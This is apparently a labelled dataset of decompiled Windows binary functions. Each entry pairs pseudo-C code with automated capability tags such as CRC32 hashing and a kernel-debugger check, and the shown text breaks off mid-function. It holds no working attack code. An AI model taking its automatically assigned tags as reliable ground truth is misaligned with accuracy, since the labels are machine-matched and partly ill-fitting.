{
    "null": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl method.std::bad_alloc.virtual_0(uint32_t arg_8h)\n\n{\n    fcn.00401039();\n    if ((arg_8h & 1) != 0) {\n        fcn.00409e64();\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00404f69": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404f69(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x40) & 1) != 0) {\n        fcn.00409e64(**(param_1 + 0x10));\n    }\n    **(param_1 + 0x10) = 0;\n    **(param_1 + 0x20) = 0;\n    **(param_1 + 0x30) = 0;\n    **(param_1 + 0x14) = 0;\n    **(param_1 + 0x24) = 0;\n    **(param_1 + 0x34) = 0;\n    *(param_1 + 0x40) = *(param_1 + 0x40) & 0xfffffffe;\n    *(param_1 + 0x3c) = 0;\n    return;\n}\n",
        "token_count": 206
    },
    "00404fdd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404fdd(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    if ((arg_8h & 1) == 0) {\n        uVar1 = 4;\n    }\n    if ((arg_8h & 2) == 0) {\n        uVar1 = uVar1 | 2;\n    }\n    if ((arg_8h & 8) != 0) {\n        uVar1 = uVar1 | 8;\n    }\n    if ((arg_8h & 4) != 0) {\n        uVar1 = uVar1 | 0x10;\n    }\n    return uVar1;\n}\n",
        "token_count": 162
    },
    "00406767": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406767(uint32_t arg_8h)\n\n{\n    fcn.00405fd6(1, 0);\n    if ((arg_8h & 1) != 0) {\n        fcn.00409e64();\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00406d6f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n\nuint __cdecl fcn.00406d6f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a0h;\n    uint var_2ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = 0;\n    piVar1 = *(unaff_EBP + 8);\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0040a0d1(0x18);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            uVar3 = fcn.00406d36(unaff_EBP + -0x2c);\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            uVar3 = fcn.00406862(uVar3);\n            *(unaff_EBP + -4) = 2;\n            *(unaff_EBP + -0x10) = 3;\n            iVar2 = fcn.00405256(uVar3, 0);\n        }\n        *(unaff_EBP + -4) = 4;\n        *piVar1 = iVar2;\n        *(unaff_EBP + -4) = 3;\n        if ((*(unaff_EBP + -0x10) & 2) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffd;\n            fcn.004068ce();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if ((*(unaff_EBP + -0x10) & 1) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffe;\n            fcn.00405fd6(1, 0);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return 2;\n}\n",
        "token_count": 562
    },
    "00407105": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_a0h\n\nuint __cdecl fcn.00407105(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_a0h;\n    uint var_2ch;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = 0;\n    piVar1 = *(unaff_EBP + 8);\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        iVar2 = fcn.0040a0d1(0x10);\n        *(unaff_EBP + 8) = iVar2;\n        *(unaff_EBP + -4) = 0;\n        if (iVar2 == 0) {\n            iVar2 = 0;\n        }\n        else {\n            uVar3 = fcn.00406d36(unaff_EBP + -0x2c);\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x10) = 1;\n            uVar3 = fcn.00406862(uVar3);\n            *(unaff_EBP + -4) = 2;\n            *(unaff_EBP + -0x10) = 3;\n            iVar2 = fcn.0040597c(uVar3, 0);\n        }\n        *(unaff_EBP + -4) = 4;\n        *piVar1 = iVar2;\n        *(unaff_EBP + -4) = 3;\n        if ((*(unaff_EBP + -0x10) & 2) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffd;\n            fcn.004068ce();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        if ((*(unaff_EBP + -0x10) & 1) != 0) {\n            *(unaff_EBP + -0x10) = *(unaff_EBP + -0x10) & 0xfffffffe;\n            fcn.00405fd6(1, 0);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return 4;\n}\n",
        "token_count": 561
    },
    "0040a0d1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0d1(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_ch;\n    \n    do {\n        iVar2 = fcn.0040d83c(arg_8h);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040e40c(arg_8h);\n    } while (iVar2 != 0);\n    if ((*0x4d251c & 1) == 0) {\n        *0x4d251c = *0x4d251c | 1;\n        fcn.0040a0b6();\n        fcn.0040b6f6(0x41c30a);\n    }\n    fcn.0040521e(0x4d2510);\n    fcn.0040a136(&var_ch, 0x4208b4);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 227
    },
    "00416c0e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00416c0e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040f0d8(0x421eb8, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0040b599();\n        *puVar2 = 0;\n        puVar2 = fcn.0040b586();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x4d40e4)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x4d4100;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00418e71(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040b586();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0040b599();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.004164db(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00416ce0(0x421eb8);\n                goto code_r0x00416cda;\n            }\n        }\n        puVar2 = fcn.0040b599();\n        *puVar2 = 0;\n        puVar2 = fcn.0040b586();\n        *puVar2 = 9;\n        fcn.0040a080(0, 0, 0, 0, 0);\n    }\ncode_r0x00416cda:\n    fcn.0040f11d();\n    return;\n}\n",
        "token_count": 638
    },
    "00417f4e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417f4e(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44131c ^ &stack0xfffffffc;\n    fcn.0040a6f0(arg_10h);\n    var_14h = fcn.00419de8(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.00419360(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x00417fa7:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00417fe7;\n        }\n        if (iVar1 != 2) {\ncode_r0x00417fd9:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00417fe7;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00417fd9;\n        goto code_r0x00417fa7;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x00417fe7:\n    fcn.0040b8b2(unaff_EBX);\n    return;\n}\n",
        "token_count": 507
    },
    "00417ff6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00417ff6(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44131c ^ &stack0xfffffffc;\n    fcn.0040a6f0(arg_10h);\n    var_14h = fcn.00419de8(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.004198a4(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0041804f:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041808f;\n        }\n        if (iVar1 != 2) {\ncode_r0x00418081:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0041808f;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x00418081;\n        goto code_r0x0041804f;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0041808f:\n    fcn.0040b8b2(unaff_EBX);\n    return;\n}\n",
        "token_count": 505
    },
    "0041868d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041868d(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.0040d978();\n    var_4h = 0;\n    if (*0x4d2ff8 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x4d2ff8 = fcn.0040d906(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x4d2ffc = fcn.0040d906(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x4d3000 = fcn.0040d906(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x4d3008 = fcn.0040d906(uVar3);\n        if (*0x4d3008 != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x4d3004 = fcn.0040d906(uVar3);\n        }\n    }\n    if ((*0x4d3004 != iVar1) && (*0x4d3008 != iVar1)) {\n        pcVar4 = fcn.0040d981(*0x4d3004);\n        pcVar5 = fcn.0040d981(*0x4d3008);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x004187cf;\n        }\n    }\n    if ((((*0x4d2ffc != iVar1) && (pcVar4 = fcn.0040d981(*0x4d2ffc),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x4d3000 != iVar1 && (pcVar4 = fcn.0040d981(*0x4d3000),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x004187cf:\n    pcVar4 = fcn.0040d981(*0x4d2ff8);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 838
    },
    "0041a4e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Removing unreachable block (ram,0x0041aa1b)\n// WARNING: Removing unreachable block (ram,0x0041aa25)\n// WARNING: Removing unreachable block (ram,0x0041aa2a)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041a4e0(uint32_t arg_8h, uint32_t noname_1, uint32_t noname_2, int32_t arg_14h, uint32_t arg_18h, int16_t *arg_1ch)\n\n{\n    int16_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint16_t uVar8;\n    uint16_t uVar9;\n    int32_t *piVar10;\n    uint32_t uVar11;\n    uint16_t uVar12;\n    uint32_t uVar13;\n    char cVar14;\n    uint32_t uVar15;\n    int16_t *piVar16;\n    int16_t *piVar17;\n    uint16_t uVar18;\n    uint16_t uVar19;\n    uint32_t uVar20;\n    uint *puVar21;\n    char *pcVar22;\n    uint var_74h;\n    uint var_70h;\n    uint16_t *var_6ch;\n    int32_t *var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    uint16_t *var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uchar var_28h;\n    uchar var_27h;\n    uchar var_26h;\n    uchar var_25h;\n    uint var_20h;\n    uint16_t var_1ch;\n    uint32_t var_1ah;\n    uint var_16h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x44131c ^ &stack0xfffffffc;\n    var_10h._0_1_ = arg_8h;\n    var_10h._1_1_ = arg_8h >> 8;\n    var_10h._2_2_ = arg_8h >> 0x10;\n    var_ch._0_2_ = noname_1;\n    var_ch._2_2_ = noname_1 >> 0x10;\n    var_8h._0_2_ = noname_2;\n    uVar8 = var_8h & 0x8000;\n    uVar13 = noname_2 & 0x7fff;\n    var_30h = 0xcccccccc;\n    var_2ch = 0xcccccccc;\n    var_28h = 0xcc;\n    var_27h = 0xcc;\n    var_26h = 0xfb;\n    var_25h = 0x3f;\n    if ((noname_2 & 0x8000) == 0) {\n        *(arg_1ch + 1) = 0x20;\n    }\n    else {\n        *(arg_1ch + 1) = 0x2d;\n    }\n    if (((uVar13 == 0) && (noname_1 == 0)) && (arg_8h == 0)) {\n        *arg_1ch = 0;\n        *(arg_1ch + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;\n        *(arg_1ch + 3) = 1;\n        *(arg_1ch + 2) = 0x30;\n        *(arg_1ch + 5) = 0;\n        goto code_r0x0041adb8;\n    }\n    if (uVar13 == 0x7fff) {\n        *arg_1ch = 1;\n        var_ch = noname_1;\n        if (((noname_1 == 0x80000000) && (arg_8h == 0)) || ((noname_1 & 0x40000000) != 0)) {\n            if (((noname_2 & 0x8000) == 0) || (noname_1 != 0xc0000000)) {\n                if ((noname_1 != 0x80000000) || (arg_8h != 0)) goto code_r0x0041a616;\n                pcVar22 = \"1#INF\";\n            }\n            else {\n                if (arg_8h != 0) {\ncode_r0x0041a616:\n                    pcVar22 = \"1#QNAN\";\n                    goto code_r0x0041a61b;\n                }\n                pcVar22 = \"1#IND\";\n            }\n            iVar6 = fcn.0040d785(arg_1ch + 2, 0x16, pcVar22);\n            if (iVar6 != 0) {\n                fcn.00409f58(0, 0, 0, 0, 0);\n            }\n            *(arg_1ch + 3) = 5;\n            noname_1 = var_ch;\n        }\n        else {\n            pcVar22 = \"1#SNAN\";\ncode_r0x0041a61b:\n            iVar6 = fcn.0040d785(arg_1ch + 2, 0x16, pcVar22);\n            noname_1 = var_ch;\n            if (iVar6 != 0) {\n                fcn.00409f58(0, 0, 0, 0, 0);\n                noname_1 = var_ch;\n            }\n            *(arg_1ch + 3) = 6;\n        }\n        goto code_r0x0041adb8;\n    }\n    var_4ch._0_2_ = ((uVar13 >> 8) + (noname_1 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar13 * 0x4d10 >> 0x10;\n    uVar15 = var_4ch;\n    var_20h._0_2_ = 0;\n    var_16h._0_1_ = uVar13;\n    var_16h._1_1_ = uVar13 >> 8;\n    var_1ah._0_2_ = var_ch;\n    var_1ah._2_2_ = var_ch._2_2_;\n    var_20h._2_2_ = arg_8h;\n    var_64h = 0x442018;\n    var_1ch = var_10h._2_2_;\n    var_1ah = noname_1;\n    if (-uVar15 != 0) {\n        uVar13 = -uVar15;\n        uVar11 = arg_8h;\n        if (0 < uVar15) {\n            var_64h = 0x442178;\n            uVar13 = uVar15;\n        }\njoined_r0x0041a6a9:\n        var_1ch = uVar11 >> 0x10;\n        arg_8h = uVar11 & 0xffff | var_10h._2_2_ << 0x10;\n        if (uVar13 != 0) {\n            var_64h = var_64h + 0x54;\n            uVar15 = uVar13 & 7;\n            uVar13 = uVar13 >> 3;\n            if (uVar15 != 0) {\n                piVar10 = uVar15 * 0xc + var_64h;\n                if (0x7fff < *piVar10) {\n                    var_3ch._0_2_ = *piVar10;\n                    var_3ch._2_2_ = *piVar10 >> 0x10;\n                    piVar2 = piVar10 + 2;\n                    var_38h._0_2_ = piVar10[1];\n                    var_38h._2_2_ = piVar10[1] >> 0x10;\n                    piVar10 = &var_3ch;\n                    var_34h = *piVar2;\n                    iVar6 = CONCAT22(var_38h, var_3ch._2_2_) + -1;\n                    var_3ch._2_2_ = iVar6;\n                    var_38h._0_2_ = iVar6 >> 0x10;\n                }\n                var_54h = 0;\n                var_10h._0_1_ = 0;\n                var_10h._1_1_ = 0;\n                var_10h._2_2_ = 0;\n                var_ch._0_2_ = 0;\n                var_ch._2_2_ = 0;\n                var_8h._0_2_ = 0;\n                var_8h._2_2_ = 0;\n                uVar18 = (*(piVar10 + 10) ^ CONCAT11(var_16h._1_1_, var_16h)) & 0x8000;\n                uVar9 = CONCAT11(var_16h._1_1_, var_16h) & 0x7fff;\n                uVar12 = *(piVar10 + 10) & 0x7fff;\n                uVar19 = uVar12 + uVar9;\n                if (((uVar9 < 0x7fff) && (uVar12 < 0x7fff)) && (uVar19 < 0xbffe)) {\n                    if (0x3fbf < uVar19) {\n                        if (((uVar9 == 0) &&\n                            (uVar19 = uVar19 + 1, \n                            (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah >> 0x10)) & 0x7fffffff) == 0)) &&\n                           ((CONCAT22(var_1ah, var_1ch) == 0 && (CONCAT22(uVar11, var_20h) == 0)))) {\n                            var_16h._0_1_ = 0;\n                            var_16h._1_1_ = 0;\n                            noname_1 = 0;\n                            goto joined_r0x0041a6a9;\n                        }\n                        if ((((uVar12 != 0) || (uVar19 = uVar19 + 1,  (piVar10[2] & 0x7fffffffU) != 0)) ||\n                            (piVar10[1] != 0)) || (*piVar10 != 0)) {\n                            var_58h = 0;\n                            puVar21 = &var_ch;\n                            var_40h = 5;\n                            do {\n                                var_50h = var_40h;\n                                if (0 < var_40h) {\n                                    var_6ch = &var_20h + var_58h * 2;\n                                    var_68h = piVar10 + 2;\n                                    do {\n                                        bVar5 = false;\n                                        uVar15 = puVar21[-1] + *var_6ch * *var_68h;\n                                        if ((uVar15 < puVar21[-1]) || (uVar15 < *var_6ch * *var_68h)) {\n                                            bVar5 = true;\n                                        }\n                                        puVar21[-1] = uVar15;\n                                        if (bVar5) {\n                                            *puVar21 = *puVar21 + 1;\n                                        }\n                                        var_6ch = var_6ch + 1;\n                                        var_68h = var_68h + -2;\n                                        var_50h = var_50h + -1;\n                                    } while (0 < var_50h);\n                                }\n                                puVar21 = puVar21 + 2;\n                                var_58h = var_58h + 1;\n                                var_40h = var_40h + -1;\n                            } while (0 < var_40h);\n                            uVar19 = uVar19 + 0xc002;\n                            if (uVar19 < 1) {\ncode_r0x0041a85c:\n                                uVar19 = uVar19 - 1;\n                                if (uVar19 < 0) {\n                                    uVar15 = -uVar19;\n                                    uVar19 = 0;\n                                    do {\n                                        if ((var_10h & 1) != 0) {\n                                            var_54h = var_54h + 1;\n                                        }\n                                        iVar3 = CONCAT22(var_8h._2_2_, var_8h);\n                                        uVar11 = CONCAT22(var_ch._2_2_, var_ch);\n                                        iVar6 = CONCAT22(var_ch._2_2_, var_ch);\n                                        var_8h._0_2_ = CONCAT22(var_8h._2_2_, var_8h) >> 1;\n                                        var_8h._2_2_ = var_8h._2_2_ >> 1;\n                                        var_ch._2_2_ = var_ch._2_2_ >> 1 | (iVar3 << 0x1f) >> 0x10;\n                                        uVar20 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) >> 1;\n                                        var_10h._2_2_ = var_10h._2_2_ >> 1 | (iVar6 << 0x1f) >> 0x10;\n                                        uVar15 = uVar15 - 1;\n                                        var_ch._0_2_ = uVar11 >> 1;\n                                        var_10h._0_1_ = uVar20;\n                                        var_10h._1_1_ = uVar20 >> 8;\n                                    } while (uVar15 != 0);\n                                    if (var_54h != 0) {\n                                        var_10h._0_1_ = var_10h | 1;\n                                    }\n                                }\n                            }\n                            else {\n                                do {\n                                    uVar12 = var_ch._2_2_;\n                                    uVar9 = var_10h._2_2_;\n                                    if ((var_8h._2_2_ & 0x8000) != 0) break;\n                                    iVar6 = CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) << 1;\n                                    var_10h._0_1_ = iVar6;\n                                    var_10h._1_1_ = iVar6 >> 8;\n                                    var_10h._2_2_ = iVar6 >> 0x10;\n                                    iVar6 = CONCAT22(var_ch._2_2_, var_ch) * 2;\n                                    var_ch._0_2_ = iVar6 | uVar9 >> 0xf;\n                                    var_ch._2_2_ = iVar6 >> 0x10;\n                                    iVar6 = CONCAT22(var_8h._2_2_, var_8h) * 2;\n                                    var_8h._0_2_ = iVar6 | uVar12 >> 0xf;\n                                    uVar19 = uVar19 - 1;\n                                    var_8h._2_2_ = iVar6 >> 0x10;\n                                } while (0 < uVar19);\n                                if (uVar19 < 1) goto code_r0x0041a85c;\n                            }\n                            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n                               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                                    var_10h._2_2_ = 0;\n                                    var_ch._0_2_ = 0;\n                                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                                        var_ch._2_2_ = 0;\n                                        var_8h._0_2_ = 0;\n                                        if (var_8h._2_2_ == 0xffff) {\n                                            var_8h._2_2_ = 0x8000;\n                                            uVar19 = uVar19 + 1;\n                                        }\n                                        else {\n                                            var_8h._2_2_ = var_8h._2_2_ + 1;\n                                        }\n                                    }\n                                    else {\n                                        iVar6 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                                        var_ch._2_2_ = iVar6;\n                                        var_8h._0_2_ = iVar6 >> 0x10;\n                                    }\n                                }\n                                else {\n                                    iVar6 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                                    var_10h._2_2_ = iVar6;\n                                    var_ch._0_2_ = iVar6 >> 0x10;\n                                }\n                            }\n                            noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                            if (uVar19 < 0x7fff) {\n                                var_16h._1_1_ = uVar19 >> 8 | uVar18 >> 8;\n                                var_20h._0_2_ = var_10h._2_2_;\n                                var_20h._2_2_ = var_ch;\n                                var_1ch = var_ch._2_2_;\n                                uVar11 = CONCAT22(var_ch._2_2_, var_ch);\n                                var_1ah._0_2_ = var_8h;\n                                var_1ah._2_2_ = var_8h._2_2_;\n                                var_1ah = CONCAT22(var_8h._2_2_, var_8h);\n                                var_16h._0_1_ = uVar19;\n                            }\n                            else {\n                                var_1ch = 0;\n                                var_1ah._0_2_ = 0;\n                                var_20h._0_2_ = 0;\n                                var_20h._2_2_ = 0;\n                                uVar11 = 0;\n                                iVar6 = ((uVar18 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                                var_1ah._2_2_ = iVar6;\n                                var_1ah = 0x80000000;\n                                var_16h._0_1_ = iVar6 >> 0x10;\n                                var_16h._1_1_ = iVar6 >> 0x18;\n                                noname_1 = CONCAT22(var_ch._2_2_, var_ch);\n                            }\n                            goto joined_r0x0041a6a9;\n                        }\n                    }\n                    var_1ah._2_2_ = 0;\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                }\n                else {\n                    iVar6 = ((uVar18 == 0) - 1 & 0x80000000) + 0x7fff8000;\n                    var_1ah._2_2_ = iVar6;\n                    var_16h._0_1_ = iVar6 >> 0x10;\n                    var_16h._1_1_ = iVar6 >> 0x18;\n                }\n                var_1ch = 0;\n                var_1ah._0_2_ = 0;\n                var_1ah = var_1ah._2_2_ << 0x10;\n                var_20h._0_2_ = 0;\n                var_20h._2_2_ = 0;\n                uVar11 = 0;\n                noname_1 = 0;\n            }\n            goto joined_r0x0041a6a9;\n        }\n    }\n    var_1ah._2_2_ = var_1ah >> 0x10;\n    var_20h._2_2_ = arg_8h;\n    uVar13 = CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_));\n    if (0x3ffe < uVar13 >> 0x10) {\n        var_4ch._0_2_ = var_4ch + 1;\n        var_50h = 0;\n        var_10h._0_1_ = 0;\n        var_10h._1_1_ = 0;\n        var_10h._2_2_ = 0;\n        arg_8h = arg_8h & 0xffff;\n        var_ch._0_2_ = 0;\n        var_ch._2_2_ = 0;\n        var_8h._0_2_ = 0;\n        var_8h._2_2_ = 0;\n        uVar13 = uVar13 >> 0x10 & 0x7fff;\n        iVar6 = uVar13 + 0x3ffb;\n        if ((uVar13 < 0x7fff) && (iVar6 < 0xbffe)) {\n            if (0x3fbf < iVar6) {\n                if ((((uVar13 == 0) &&\n                     (iVar6 = uVar13 + 0x3ffc, \n                     (CONCAT13(var_16h._1_1_, CONCAT12(var_16h, var_1ah._2_2_)) & 0x7fffffff) == 0)) &&\n                    (CONCAT22(var_1ah, var_1ch) == 0)) && (CONCAT22(var_20h._2_2_, var_20h) == 0)) {\n                    var_16h._0_1_ = 0;\n                    var_16h._1_1_ = 0;\n                    noname_1 = 0;\n                    goto code_r0x0041abf0;\n                }\n                var_58h = 0;\n                puVar21 = &var_ch;\n                var_40h = 5;\n                do {\n                    var_54h = var_40h;\n                    if (0 < var_40h) {\n                        var_48h = &var_28h;\n                        puVar7 = &var_20h + var_58h * 2;\n                        do {\n                            bVar5 = false;\n                            uVar13 = puVar21[-1] + *var_48h * *puVar7;\n                            if ((uVar13 < puVar21[-1]) || (uVar13 < *var_48h * *puVar7)) {\n                                bVar5 = true;\n                            }\n                            puVar21[-1] = uVar13;\n                            if (bVar5) {\n                                *puVar21 = *puVar21 + 1;\n                            }\n                            var_48h = var_48h + -1;\n                            puVar7 = puVar7 + 1;\n                            var_54h = var_54h + 